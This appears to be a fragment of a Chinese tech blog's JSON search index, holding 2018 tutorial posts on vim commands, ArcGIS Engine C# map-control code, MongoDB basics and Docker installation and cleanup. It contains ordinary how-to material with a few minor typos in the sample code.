2.txt（或者编号）可以删除以前编辑过的列表中的文件项目 命令行模式下输入:e! 4.txt，新打开文件4.txt，放弃正在编辑的文件 命令行模式下输入:f 显示正在编辑的文件名 命令行模式下输入:f new.txt，改变正在编辑的文件名字为new.txt 2.1.3 恢复文件 由于在线环境的特殊性，请在本机尝试 如果因为断电等原因造成文档没有保存，可以采用恢复方式，vim -r进入文档后，输入:ewcover 1.txt来恢复 $ vim -r 1.txt 2.2.1 可视模式命令简介 在普通模式下输入 v（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。 在普通模式下输入 Shift+v（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次 Shift+v 就可以取消选取。 在普通模式下输入 Ctrl+v（小写），这是区域选择模式，可以进行矩形区域选择，再按一次 Ctrl+v 取消选取。 在可视模式下输入 d 删除选取区域内容 在可视模式下输入y复制选取区域内容 2.3.1 视窗操作简介 vim 可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为 vim 的视窗。 打开方法有很多种，例如可以使用在命令行模式下输入 :new 打开一个新的 vim 视窗，并进入视窗编辑一个新文件（普通模式下输入 Ctrl+w也可以），除了 :new 命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗： 注意：快捷键可能会与浏览器的快捷键冲突，可换为 IE 浏览器进行实验或者在浏览器设置里禁用浏览器快捷键。 命令行模式下输入:sp 1.t","date":"2018-11-20","objectID":"/vim%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/:0:0","tags":["vim","Linux"],"title":"vim基本命令","uri":"/vim%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"},{"categories":["GIS"],"content":" // 鹰眼视图功能 ... // OnMapReplaced当mapcontrol1中的地图被替换时，该方法自动加载主空间中所有的图层对象到鹰眼 private void mainMapControl_OnMapReplaced(object sender, IMapControlEvents2_OnMapReplacedEvent e) { if (mainMapControl.Map.LayerCount \u003e 0) { for (int i = 0; i \u003c mainMapControl.Map.LayerCount; i++) { // 加载 eyeMapControl.AddLayer(mainMapControl.get_Layer(i)); } // 鹰眼视图的范围等于mainMap当前的范围 eyeMapControl.Extent = mainMapControl.Extent; eyeMapControl.ActiveView.Refresh(); } } //鹰眼功能 范围更新 // //--2、在主控件中使用鼠标拖拽视图的时候，鹰眼控件中出现红色矩形框 //--2、该方法发生在主视图的范围发生变换后， private void mainMapControl_OnExtentUpdated(object sender, IMapControlEvents2_OnExtentUpdatedEvent e) { IEnvelope pEnvelope = (IEnvelope)e.newEnvelope; IGraphicsContainer pGraphicsContainer = eyeMapControl.Map as IGraphicsContainer; IActiveView pActiveView = pGraphicsContainer as IActiveView; pGraphicsContainer.DeleteAllElements(); IRectangleElement pRectangleEle = new RectangleElementClass(); IElement pElement = pRectangleEle as IElement; pElement.Geometry = pEnvelope; IRgbColor pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 255; ILineSymbol pOutline = new SimpleLineSymbolClass(); pOutline.Width = 3; pOutline.Color = pColor; pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 0; IFillSymbol pFillSymbol = new SimpleFillSymbolClass(); pFillSymbol.Color = pColor; pFillSymbol.Outline = pOutline; IFillShapeElement pFillShapeEle = pElement as IFillShapeElement; pFillShapeEle.Symbol = pFillSymbol; pGraphicsContainer.AddElement((IElement)pFillShapeEle, 0); pActiveView.PartialRefresh(esriViewDrawPhase.esriViewGraphics, null, null); } // 鹰眼视图功能 鹰眼视图点击=》主图范围跟着变化 private void eyeMapControl_OnMouseDown(object sender, IMapControlEvents2_OnMouseDownEvent e) { // 如果被点击 if (e.button == 1) { IPoint point = new ESRI.ArcGIS.Geometry.Point(); //获取点击鹰眼视图的点击的位置 point.PutCoords(e.mapX, e.mapY); // 主图的中心位于点击的点point上 mainMapControl.CenterAt(point); mainMapControl.ActiveView.Refresh(); } // 如果是右键 else if (e.button == 2) { IEnvelope pEnv = eyeMapControl.TrackRectangle(); mainMapControl.Extent = pEnv; mainMapControl.ActiveView.Refresh(); } } private void eyeMapControl_OnMouseMove(object sender, IMapControlEvents2_OnMouseMoveEvent e) { if (e.button == 1) { IPoint pPoint = new PointClass(); pPoint.PutCoords(e.mapX, e.mapY); mainMapControl.CenterAt(pPoint); mainMapControl.ActiveView.Refresh(); } } ","date":"2018-11-02","objectID":"/arcgisengine-%E9%B9%B0%E7%9C%BC%E5%8A%9F%E8%83%BD/:0:0","tags":["ArcEngine","C#"],"title":"ArcgisEngine鹰眼功能","uri":"/arcgisengine-%E9%B9%B0%E7%9C%BC%E5%8A%9F%E8%83%BD/"},{"categories":["GIS"],"content":"一句代码 创建winform程序 必须要添加LicenseControl控件 TOCControl视图控件 =\u003e 属性,设置关联属性绑定(Buddy)到地图控件上 ToolbalControl工具条控件 伙伴控价 =\u003e 设置关联属性绑定到地图控件上 MapControl地图控件 也可以设置属性设置默认打开的地图 引用ESRI.ArcGIS.Version 在主程序代码中加入： //在窗口加载前添加 绑定产品码 // 注意是 program.cs文件 ESRI.ArcGIS.RuntimeManager.Bind(ESRI.ArcGIS.ProductCode.EngineOrDesktop); 才能正常运行 ","date":"2018-11-01","objectID":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/:0:1","tags":["ArcEngine","GIS"],"title":"ArcEngine初识 -- 打开地图","uri":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/"},{"categories":["GIS"],"content":"常见的AE控价 PageLayoutControl 布局视图 TOOControl 内容列表 MapControl 数据视图 ","date":"2018-11-01","objectID":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/:0:2","tags":["ArcEngine","GIS"],"title":"ArcEngine初识 -- 打开地图","uri":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/"},{"categories":["GIS"],"content":"打开地图文档 F1 自己写的 //打开mxd文档 F1 try { //实例化一个对象 OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = \"打开地图文档\"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = \"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt\";|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\"/文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; // 存储打开的文件路径 //判断如果文件正常打开 if (open.ShowDialog() == DialogResult.OK) { // 获取文件路径 path+name string fileName = open.FileName; // 数据窗口加载地图文档 axMapControl1.LoadMxFile(fileName); // 刷新一下页面 axMapControl1.ActiveView.Refresh(); // 伙伴控件可以通过下面的方式来进行绑定 axTOCControl1.SetBuddyControl(axMapControl1); } } catch(Exception) { MessageBox.Show(\"请打开正确的文档!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information); } } F2 使用IMapControl接口的LoadMxFile方法 OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = \"打开地图文档\"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = \"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\";//文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; // 存储打开的文件路径 open.ShowDialog(); //文件名 string fileName = open.FileName; if (fileName == \"\") { return; } //检查地图文档有效性 if (mainMapControl.CheckMxFile(fileName)) { mainMapControl.LoadMxFile(fileName); mainMapControl.ActiveView.Refresh(); } else { MessageBox.Show(fileName + \"是无效的地图文档!\", \"信息提示\"); return; } F3 使用IMapDocument接口 // using ESRI.ArcGIS.Carto; OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = \"打开地图文档\"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = @\"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\";//文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; //打开窗口 open.ShowDialog(); // 存储打开的文件路径 string fileName = open.FileName; if (mainMapControl.CheckMxFile(fileName)) { //将数据载入pMapDocument并与Map控件关联 IMapDocument pMapDocument = new MapDocument(); // using ESRI.ArcGIS.Carto; pMapDocument.Open(fileName, \"\"); //获取Map地图中激活的地图文档 mainMapControl.Map = pMapDocument.ActiveView.FocusMap; mainMapControl.ActiveView.Refresh(); } F4 使用ControlsOpenDocCommandClass类库资源 =》 适合比赛用 //using ESRI.ArcGIS.Controls; ICommand command = new ControlsOpenDocCommandClass(); //using ESRI.ArcGIS.Controls; command.OnCreate(mainMapControl.Object); command.OnClick(); mainTOCControl.SetBuddyControl(mainMapControl); 待改进之处： 窗口的大小以及出现的位置，美化 Form的name随着文档的名字改变 ","date":"2018-11-01","objectID":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/:0:3","tags":["ArcEngine","GIS"],"title":"ArcEngine初识 -- 打开地图","uri":"/arcgisengine-%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3/"},{"categories":["GIS"],"content":"加载shapefile数据 F1 使用AddShapefile方法 private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e) { try { //同样实例化一个打开文件的类对象 OpenFileDialog open = new OpenFileDialog(); // 如果打开正确 if (open.ShowDialog() == DialogResult.OK) { //首先定义一个空的路径 string filePath = string.Empty; // 然后定义一个空的文件名 string file = string.Empty; // 获取完整的文件路径 string filedir = open.FileName; //如果路径为空，嘛都不返回 if (fileDir == \"\") return; // 对完整路径进行截取 获取最后一个斜杠的索引 int pos = filedir.LastIndexOf('\\\\'); // 截取字符串 路径 filePath =filedir.Substring(0, pos); //文件名 file = filedir.Substring(pos+1); // 需要两个参数 axMapControl1.AddShapeFile(filePath, file); //刷新 axMapControl1.ActiveView.Refresh(); } } catch (Exception) { MessageBox.Show(\"请打开正确的文档!\", \"提醒\",MessageBoxButtons.OK, MessageBoxIcon.Error ); } } F2 使用工作空间 思路: 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。 创建FeatureLayer的实例，定义数据集。 使用AddLayer方法加载数据。 using ESRI.ArcGIS.Geodatabase; using ESRI.ArcGIS.DataSourcesFile; using ESRI.ArcGIS.DataSourcesRaster; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Title = \"打开Shape文件\"; open.RestoreDirectory = true; open.Filter = \"Shape文件(*.shp)|**.shp\"; open.RestoreDirectory = true; open.ShowDialog(); //获取完整的文件路径 :path+name string fileDir = open.FileName; //路径为空不返回 if (fileDir == \"\") return; // 对完整路径进行截取 int pos = fileDir.LastIndexOf(\"\\\\\"); // 路径 string pfilePath = fileDir.Substring(0, pos); //文件名 string file = fileDir.Substring(pos + 1); //实例化ShapefileWorkspaceFactory工作空间，打开Shape文件 IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass(); //强制转换 打开路径 IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace; //创建并实例化要素类 IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ","date":"2018-11-01","objectID":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/:0:1","tags":["ArcEngine","C#","GIS"],"title":"ArcEngine加载数据","uri":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/"},{"categories":["GIS"],"content":"加载栅格数据 主要用到以下2个接口： IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问 Present属性–判断栅格数据集是否存在金字塔 Create方法–为栅格数据集创建金字塔 IRasterLayer接口继承自ILayer接口 CreateFromDataset方法–从已有的栅格数据集对象创建图层 CreateFromRaster方法–从已有的栅格对象创建图层 Raster属性–获取IRasterLayer接口中的Raster对象 DisplayResolutionFactor属性–设置栅格数据的分辨率 1.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件 IRasterLayer rasterLayer = new RasterLayerClass(); rasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径 axMapControl1.AddLayer(rasterLayer, 0); 2.思路: (1)使用OpenFromFile方法获得栅格文件的工作区 (2)使用OpenRasterDataset方法获得栅格文件的数据集 (3)判断栅格数据集是否具有金字塔 (4)创建pRasterLayer，并定义数据集 (5)使用AddLayer方法加载数据 OpenFileDialog pOpenFileDialog = new OpenFileDialog(); pOpenFileDialog.CheckFileExists = true; pOpenFileDialog.Title = \"加载栅格数据\"; pOpenFileDialog.Filter = \"栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img\"; pOpenFileDialog.ShowDialog(); //获取名字 string pRasterFilename = pOpenFileDialog.FileName; if (pRasterFilename == \"\") return; // IO里面获取文件名字与路径的固定用法 string pPath = System.IO.Path.GetDirectoryName(pRasterFilename); string pFileName = System.IO.Path.GetFileName(pRasterFilename); IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory(); IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace; IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName); //影像金字塔的判断与创建 IRasterPyramid3 pRasPyramid; pRasPyramid = pRasterDataset as IRasterPyramid3; if (pRasPyramid != null) { if (!(pRasPyramid.Present)) { //创建金字塔 pRasPyramid.Create(); } } IRaster pRaster; pRaster = pRasterDataset.CreateDefaultRaster(); IRasterLayer pRasterLayer; pRasterLayer = new RasterLayerClass(); pRasterLayer.CreateFromRaster(pRaster); ILayer pLayer = pRasterLayer as ILayer; mainMapControl.AddLayer(pLayer, 0); ","date":"2018-11-01","objectID":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/:0:2","tags":["ArcEngine","C#","GIS"],"title":"ArcEngine加载数据","uri":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/"},{"categories":["GIS"],"content":"加载CAD数据 1.作为矢量图层加载 === 1)分图层加载 IWorkspaceFactory pWorkspaceFactory; IFeatureWorkspace pFeatureWorkspace; pWorkspaceFactory = new CadWorkspaceFactory(); pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0); //加载CAD文件中的线文件 IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + \":polyline\"); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFileName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); 2.作为矢量图层加载 === 1)整幅图加载 //打开CAD数据集 IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile; IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace; //打开一个要素集 IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName); // IFeatureContainer可以管理IFeatureDataset中的每个要素类 IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //对CAD文件中的要素进行遍历处理 for (int i = 0; i \u003c pFeatureContainer.ClassCount; i++) { IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //如果是注记， 则添加注记层 if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } else //如果是点线面则添加要素层 { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); } F3.作为栅格图层加载 IWorkspaceFactory pWorkspaceFactory; IWorkspace pWorkspace; ICadDrawingDataset pCadDrawingDataset; ICadDrawingWorkspace pCadDrawingWorkspace; ICadLayer pCadLayer; pWorkspaceFactory = new CadWorkspaceFactoryClass(); pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace; //获得CAD文件的数据集 pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName); pCadLayer = new CadLayerClass(); pCadLayer.CadDrawingDataset = pCadDrawingDataset; mainMapControl.Map.AddLayer(pCadLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); 加载个人地理数据库 加载文件地理数据库 ","date":"2018-11-01","objectID":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/:0:3","tags":["ArcEngine","C#","GIS"],"title":"ArcEngine加载数据","uri":"/arcgisengine-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/"},{"categories":["GIS"],"content":" // 数据视图与布局视图同步 private void mainMapControl_OnAfterScreenDraw(object sender, IMapControlEvents2_OnAfterScreenDrawEvent e) { IActiveView pActiveView = (IActiveView)mainPageLayoutControl1.ActiveView.FocusMap; IDisplayTransformation displayTransformation = pActiveView.ScreenDisplay.DisplayTransformation; displayTransformation.VisibleBounds = mainMapControl.Extent; mainPageLayoutControl1.ActiveView.Refresh(); CopyToPageLayout(); // 调用下面的函数 } // CopyToPageLayout() 布局视图与数据视图同步 private void CopyToPageLayout() { IObjectCopy pObjectCopy = new ObjectCopyClass(); object copyFromMap = mainMapControl.Map; object copiedMap = pObjectCopy.Copy(copyFromMap); // 复制地图到copiedMap中 object copyToMap = mainPageLayoutControl1.ActiveView.FocusMap; pObjectCopy.Overwrite(copiedMap, ref copyToMap); // 复制地图 mainPageLayoutControl1.ActiveView.Refresh(); } ","date":"2018-11-01","objectID":"/arcgisengine-%E6%95%B0%E6%8D%AE%E8%A7%86%E5%9B%BE%E4%B8%8E%E5%B8%83%E5%B1%80%E8%A7%86%E5%9B%BE%E7%9A%84%E5%90%8C%E6%AD%A5/:0:0","tags":["ArcEngine","GIS"],"title":"ArcEngine同步数据视图与布局视图","uri":"/arcgisengine-%E6%95%B0%E6%8D%AE%E8%A7%86%E5%9B%BE%E4%B8%8E%E5%B8%83%E5%B1%80%E8%A7%86%E5%9B%BE%E7%9A%84%E5%90%8C%E6%AD%A5/"},{"categories":["GIS"],"content":"地图文档保存 问题：空文档也能保存 private void saveToolStrip_Click(object sender, EventArgs e) { try { string sMxdFileName = mainMapControl.DocumentFilename; IMapDocument pMapDocument = new MapDocumentClass(); //检查文档是否为空以及有效性 if (sMxdFileName != null \u0026\u0026 mainMapControl.CheckMxFile(sMxdFileName)) { if (pMapDocument.get_IsReadOnly(sMxdFileName)) { MessageBox.Show(\"地图本当为只读，不能保存！\"); pMapDocument.Close(); return; } else { SaveFileDialog pSaveFileDialog = new System.Windows.Forms.SaveFileDialog(); pSaveFileDialog.Title = \"请选择保存路径\"; pSaveFileDialog.Filter = \"ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt\"; //当相同的文件存在是提示错误 pSaveFileDialog.OverwritePrompt = true; pSaveFileDialog.RestoreDirectory = true; if (pSaveFileDialog.ShowDialog() == DialogResult.OK) { //获取名字 sMxdFileName = pSaveFileDialog.FileName; } else { return; } pMapDocument.New(sMxdFileName); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); //保存为绝对路径 pMapDocument.Save(pMapDocument.UsesRelativePaths, true); pMapDocument.Close(); MessageBox.Show(\"保存文档成功\"); } } } catch (Exception ex) { MessageBox.Show(ex.Message); } } ","date":"2018-11-01","objectID":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/:0:1","tags":["ArcEngine","GIS"],"title":"ArcEngine文件保存功能","uri":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/"},{"categories":["GIS"],"content":"地图文档另存为1 测试 private void saveAsToolStrip_Click(object sender, EventArgs e) { try { SaveFileDialog pSaveDialog = new System.Windows.Forms.SaveFileDialog(); pSaveDialog.Title = \"另存为\"; pSaveDialog.OverwritePrompt = true;//当相同的文件存在是提示错误 pSaveDialog.Filter = \"ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt\"; pSaveDialog.RestoreDirectory = true; if (pSaveDialog.ShowDialog() == DialogResult.OK) { string sFilePath = pSaveDialog.FileName; IMapDocument pMapDocument = new MapDocumentClass(); pMapDocument.New(sFilePath); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); pMapDocument.Save(true, true); pMapDocument.Close(); } } catch (Exception ex) { MessageBox.Show(ex.Message); } } ","date":"2018-11-01","objectID":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/:0:2","tags":["ArcEngine","GIS"],"title":"ArcEngine文件保存功能","uri":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/"},{"categories":["GIS"],"content":"地图另存为2 ICommand command = new ControlsSaveAsDocCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); ","date":"2018-11-01","objectID":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/:0:3","tags":["ArcEngine","GIS"],"title":"ArcEngine文件保存功能","uri":"/arcgisengine-%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98/"},{"categories":["GIS"],"content":"全图 private void FullExtentTSButton_Click(object sender, EventArgs e) { mainMapControl.Extent = mainMapControl.FullExtent; } 等比例放大 private void btnZoomInStep_Click(object sender, EventArgs e) { IEnvelope pEnvelope; pEnvelope = mainMapControl.Extent; pEnvelope.Expand(0.5, 0.5, true); //放大2倍 mainMapControl.Extent = pEnvelope; mainMapControl.ActiveView.Refresh(); } 等比例缩小 private void btnZoomIOutStep_Click(object sender, EventArgs e) { IActiveView pActiveView = mainMapControl.ActiveView; IPoint centerPoint = new PointClass(); centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2); IEnvelope envlop = pActiveView.Extent; envlop.Expand(1.5, 1.5, true); //与放大的区别在于Expand的参数不同 pActiveView.Extent.CenterAt(centerPoint); pActiveView.Extent = envlop; pActiveView.Refresh(); //如果觉得乱的话，直接修改放大的参数也将就可以 非万不得已不用 //IEnvelope pEnvelope; //pEnvelope = mainMapControl.Extent; //pEnvelope.Expand(1.5, 1.5, true); //放大2倍 //mainMapControl.Extent = pEnvelope; //mainMapControl.ActiveView.Refresh(); } 上一视图 // 定义全局变量 IExtentStack pExtentStack; private void PreViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到前一视图，第一个视图没有前视图 if (pExtentStack.CanUndo()) { pExtentStack.Undo(); //撤销到上一视图范围 NextViewTSButton.Enabled = true; //后一视图可以使用 if (!pExtentStack.CanUndo()) { PreViewTSButton.Enabled = false; //前一视图不能使用 } } mainMapControl.ActiveView.Refresh(); } 下一视图 private void NextViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到后一视图，最后一个视图没有后一视图 if (pExtentStack.CanRedo()) //如果可以重做下一视图 { pExtentStack.Redo(); //重做到下一视图 PreViewTSButton.Enabled = true; //上一视图按钮可以使用 if (!pExtentStack.CanRedo()) //如果不可以重做下一视图 { NextViewTSButton.Enabled = false; //下一视图不能用 } } mainMapControl.ActiveView.Refresh(); } ","date":"2018-11-01","objectID":"/arcengine%E5%9C%B0%E5%9B%BE%E6%B5%8F%E8%A7%88%E5%8A%9F%E8%83%BD/:0:0","tags":["ArcEngine","GIS"],"title":"ArcgisEngine实现地图浏览","uri":"/arcengine%E5%9C%B0%E5%9B%BE%E6%B5%8F%E8%A7%88%E5%8A%9F%E8%83%BD/"},{"categories":["数据库"],"content":"分布式： 一个任务分成多个子任务完成 （副手） 集群： 一个任务由多态服务器同时服务 大数据 文档结构，海量数据，大容量存储，高校存储大量二进制文件 场景： 1.需要不断扩容； 2.新应用，需求会变，数据模型无法确定； 3.高可用（不宕机） 4.需要整合多个外部数据源 SQL术语 MongoDB术语 解释说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 字段/域 index index 索引 table joins 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 文档：就是一个对象，由键值对构成，是json的一种扩展 Bson形式 字段(域)之间可以是不同类型: ``{‘book’:‘xxx’, ‘hero’:‘yyy’}` {'name':'sjz', 'age':18} 下载完成后，将可执行文件添加到PATH路径中 export PATH=/user/local/mondodb/bin:$PATH 服务端mongod 配置文件位置 etc/mongod.conf 默认端口 27017 查看端口： ss -tnl 数据库服务启动/停止/重启 sudo service mongodb start/stop/restart 查看状态： sudo service mongodb status 客户端启动 mongo 连接mongodb: # 进入 mongo # 退出 exit 或者 ctrl + c 或 quit() ","date":"2018-11-01","objectID":"/mongodb%E5%88%9D%E8%AF%86%E5%8F%8A%E5%BA%93%E7%BA%A7%E6%93%8D%E4%BD%9C/:0:0","tags":["MongoDB","数据库"],"title":"MongoDB初试及基本操作","uri":"/mongodb%E5%88%9D%E8%AF%86%E5%8F%8A%E5%BA%93%E7%BA%A7%E6%93%8D%E4%BD%9C/"},{"categories":["数据库"],"content":"数据库级操作： 1.查看所有数据库 show dbs 2.创建数据库 use mydb # 创建之后，如果不插入数据的话， show dbs是看不到刚建立的数据库的 3.显示当前数据库 db 4.删除数据库 db.dropDatabase() # 注意大小写 ","date":"2018-11-01","objectID":"/mongodb%E5%88%9D%E8%AF%86%E5%8F%8A%E5%BA%93%E7%BA%A7%E6%93%8D%E4%BD%9C/:1:0","tags":["MongoDB","数据库"],"title":"MongoDB初试及基本操作","uri":"/mongodb%E5%88%9D%E8%AF%86%E5%8F%8A%E5%BA%93%E7%BA%A7%E6%93%8D%E4%BD%9C/"},{"categories":["GIS"],"content":"下面介绍一种“万能”加载数据的办法： // 加载很多种数据 ICommand command = new ControlsAddDataCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); mainMapControl.ActiveView.Refresh(); ","date":"2018-11-01","objectID":"/arcgisengine-%E4%B8%87%E8%83%BD%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E6%96%B9%E6%B3%95/:0:0","tags":["ArcEngine","GIS"],"title":"ArcEngine\"万能\"\"加载数据方法","uri":"/arcgisengine-%E4%B8%87%E8%83%BD%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E6%96%B9%E6%B3%95/"},{"categories":["docker"],"content":"先查看容器运行状态 docker ps -a 找到image对应的容器，先stop # id docker stop d751d48a6d0a 再删除容器 docker rm d751d48a6d0a 最后才能删除镜像 docker rmi fce289e99eb9 # 查看镜像，删除ok docker images 注：rm与rmi的区别 rm Remove one or more containers rmi Remove one or more images ","date":"2018-03-09","objectID":"/docker%E5%88%A0%E9%99%A4%E6%9F%90image/:0:0","tags":["docker"],"title":"docker删除镜像和容器","uri":"/docker%E5%88%A0%E9%99%A4%E6%9F%90image/"},{"categories":["docker"],"content":"docker：有两个版本:docker-ce(社区版)和docker-ee(企业版)。 笔者这里介绍安装或升级的是最新版docker-ce(社区版)。 参考官网地址：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#os-requirements docker-compse：可运行和管理多个docker容器。 docker-machine：docker官方提供的docker管理工具。可管理多个docker主机，可搭建swarm集群。 一、docker安装 1，卸载旧版本docker 全新安装时，无需执行该步骤 $ sudo apt-get remove docker docker-engine docker.io 2，更新系统软件 $ sudo apt-get update 3，安装依赖包 $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ software-properties-common 4，添加官方密钥 执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。 $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 显示OK,表示添加成功. 5，添加仓库 $ sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\" 6，再次更新软件 经实践，这一步不能够省略，我们需要再次把软件更新到最新，否则下一步有可能会报错。 $ sudo apt-get update 